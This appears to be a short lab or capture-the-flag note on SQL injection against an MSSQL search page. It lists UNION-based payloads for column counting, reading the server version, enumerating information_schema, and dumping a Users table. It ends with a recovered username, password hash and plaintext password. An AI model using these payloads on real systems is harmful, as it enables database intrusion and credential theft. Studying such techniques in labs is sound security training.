# MSSQL

/search.asp

```
Going with artist name.
' 500 error
'' ok

' ORDER BY 1-- ok
' ORDER BY 2-- ok
' ORDER BY 3-- nope.

' UNION SELECT NULL,NULL-- ok
' UNION SELECT 'a',NULL-- ok

' UNION SELECT 'a','a'-- nope
' UNION SELECT 'a','1'-- ok.
' UNION SELECT @@version,NULL-- ok.
```

Name: Microsoft SQL Server 2012 - 11.0.2100.60 (X64) Feb 10 2012 19:39:15 Copyright (c) Microsoft Corporation Express Edition (64-bit) on Windows NT 6.2 (Build 9200: ) (Hypervisor) - From the year:

https://portswigger.net/web-security/sql-injection/examining-the-database

SELECT \* FROM information\_schema.tables

TABLE\_CATALOG TABLE\_SCHEMA TABLE\_NAME TABLE\_TYPE

```
' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
```

SELECT \* FROM information\_schema.columns WHERE table\_name = 'Users'

TABLE\_CATALOG TABLE\_SCHEMA TABLE\_NAME COLUMN\_NAME DATA\_TYPE

```
' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name = 'Users'--
```

```
' UNION SELECT pass,id FROM Users--
' UNION SELECT name,id FROM Users--
```

george - 7d9264f1c1c042b799ef08da95a782d4 - 123pass123
